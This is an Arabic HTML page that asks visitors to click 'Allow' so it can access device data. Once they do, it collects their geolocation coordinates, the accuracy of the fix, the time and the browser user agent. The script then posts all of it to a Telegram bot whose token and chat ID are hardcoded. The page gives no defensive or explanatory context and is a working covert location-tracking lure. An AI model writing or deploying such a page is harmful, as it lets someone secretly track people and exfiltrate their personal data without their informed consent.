<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب الإذن</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            direction: rtl;
            padding: 50px;
            background-color: #f0f0f0;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #status {
            margin-top: 20px;
            color: #333;
        }
    </style>
</head>
<body>
    <h1>طلب الوصول إلى البيانات</h1>
    <p>اضغط على الزر أدناه للسماح بالوصول إلى بيانات الجهاز (مثل الموقع).</p>
    <button onclick="requestPermission()">السماح</button>
    <p id="status">لم يتم طلب الإذن بعد.</p>

    <script>
        async function requestPermission() {
            try {
                // طلب إذن الموقع الجغرافي كمثال
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const data = `
بيانات المستخدم:
- الموقع الجغرافي: ${position.coords.latitude}, ${position.coords.longitude}
- دقة الموقع: ${position.coords.accuracy} متر
- الوقت: ${new Date(position.timestamp).toLocaleString()}
- المتصفح: ${navigator.userAgent}
- عنوان IP (تقريبي): غير متاح مباشرة عبر المتصفح
                        `;
                        document.getElementById('status').innerText = 'تم إرسال البيانات بنجاح!';
                        await sendToTelegram(data);
                    },
                    (error) => {
                        document.getElementById('status').innerText = 'تم رفض الإذن أو حدث خطأ.';
                        console.error(error);
                    }
                );
            } catch (error) {
                document.getElementById('status').innerText = 'خطأ في طلب الإذن.';
                console.error(error);
            }
        }

        async function sendToTelegram(message) {
            const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
            const chatId = '6733154889';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                if (!response.ok) {
                    throw new Error('فشل إرسال البيانات إلى تيليجرام');
                }
                console.log('تم إرسال البيانات إلى تيليجرام بنجاح');
            } catch (error) {
                document.getElementById('status').innerText = 'خطأ في إرسال البيانات إلى تيليجرام.';
                console.error(error);
            }
        }
    </script>
</body>
</html>
